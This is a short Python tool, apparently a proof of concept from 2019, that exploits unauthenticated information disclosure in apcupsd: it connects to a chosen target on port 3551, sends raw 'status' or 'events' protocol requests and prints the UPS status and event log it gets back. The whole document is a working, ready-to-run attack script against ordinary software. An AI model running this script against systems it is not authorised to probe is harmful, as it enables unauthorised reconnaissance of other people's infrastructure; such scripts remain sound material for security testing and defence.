#!/usr/bin/env python3
#
# Unauthenticated Information Disclosure in apcupsd of APC UPS
# dash@undisclose.de
#

import os
import sys
import socket
import string
import argparse

status = "\x00\x06\x73\x74\x61\x74\x75\x73".encode()
events = "\x00\x06\x65\x76\x65\x6e\x74\x73".encode()
protoend = "\x00\x00".encode()

def socket_go(target,port,mode):
	
	sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

	try:
		sock.connect((target,port))
		sock.send(mode)
	except ConnectionRefusedError as e:
		print ("[-] Target: %s:%d - %s " % (target,port,e))
		sys.exit(1)
	except TimeoutError as e:
		print ("[-] Target: %s:%d - %s " % (target,port,e))
		sys.exit(1)

	out=""
	while [ 1 ]:
		data = sock.recv(4096)
		out = out + data.decode()
		if len(data) == 0:
			break
		elif data.find(protoend)>0:
			break
	return out

def parse_output(out):
	''' basically remove non-printable protocol parts and interpret newlines ;)'''
	output = ''.join([x for x in out if x in string.printable])
	print(output)

def run(args):

	target = args.target
	port = args.port
	mode = args.mode

	if mode == "status":
		out=socket_go(target,port,status)
	elif mode == "events":
		out=socket_go(target,port,events)
	else:
		print("Sorry, unknown mode %s" % mode)
		print("Supported modes:\n* status\n* events\n")
		sys.exit(1)
	
	printme=parse_output(out)

	print("Let's move on.")



def main():
	''' we got a main :)'''

	__tool__        = 'apcupsd_disclosure.py'
	__version__ 	= '0.1'
	__author__      = 'dash@undisclose.de'
	__date__        = 'June 2019'

	parser_desc = 'Lil\' tool for Information Disclosure of apcupsd'
	prog_desc = __tool__ + ' ' + __version__ + ' ' + __author__ + ' ' + __date__
	parser = argparse.ArgumentParser(prog = prog_desc, description=parser_desc)

	parser.add_argument('-m','--mode',action="store",dest='mode',required=False,help='define the mode, two modes exist: "status" and "events", default is "status"', default="status")
	parser.add_argument('-t','--target',action="store",dest='target',required=True,help='define the target', default=False)
	parser.add_argument('-p','--port',action="store",dest='port',required=False,help='define the target port', default=3551)

	if(len(sys.argv)<2):
		print("Sorry, to few arguments")
		sys.exit(1)

	args = parser.parse_args()

	run(args)

if __name__ == "__main__":
	main()


